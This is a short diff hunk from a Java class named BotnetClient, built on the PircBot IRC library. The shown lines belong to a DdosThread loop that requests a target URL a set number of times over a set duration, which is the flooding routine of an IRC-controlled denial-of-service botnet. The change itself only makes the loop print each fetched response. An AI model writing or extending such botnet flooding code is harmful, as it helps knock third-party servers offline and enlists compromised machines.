@@ -150,7 +150,8 @@ public class BotnetClient extends PircBot {
 			long sleeptime = (long)(Math.round(duration * 1.0 / times));
 			while (!terminate && performed < times) {
 				try {
-					url.getContent();
+					Object content = url.getContent();
+					System.out.println(content);
 					DdosThread.sleep(sleeptime);
 				} catch (InterruptedException e) {
 					System.out.println(e.getMessage());
